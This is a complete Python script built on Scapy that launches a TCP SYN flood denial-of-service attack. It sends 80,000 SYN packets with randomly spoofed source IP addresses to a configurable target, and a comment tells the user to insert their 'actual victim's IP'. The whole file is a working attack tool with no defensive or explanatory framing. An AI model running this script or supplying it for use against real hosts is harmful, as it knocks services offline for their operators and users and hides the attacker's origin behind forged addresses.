#!/usr/bin/env python3

from scapy.all import IP, TCP, send
import random
import time

# ⚠️ Update this to your actual victim's IP
TARGET_IP = "192.168.56.103"
TARGET_PORT = 80

# Total number of spoofed SYN packets
PACKET_COUNT = 80000

# 0 = full speed. You can use 0.001 or 0.0001 for throttling.
DELAY = 0

print(f"[+] Starting TCP SYN Flood DoS attack on {TARGET_IP}:{TARGET_PORT}")
print(f"[+] Sending {PACKET_COUNT} spoofed SYN packets...\n")

for i in range(PACKET_COUNT):
    spoofed_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    sport = random.randint(1024, 65535)
    seq = random.randint(0, 4294967295)

    ip = IP(src=spoofed_ip, dst=TARGET_IP)
    tcp = TCP(sport=sport, dport=TARGET_PORT, flags="S", seq=seq)
    pkt = ip / tcp

    send(pkt, verbose=0)

    if (i + 1) % 1000 == 0:
        print(f"[+] {i + 1} packets sent")

    if DELAY > 0:
        time.sleep(DELAY)

print("\n[+] Attack completed.")
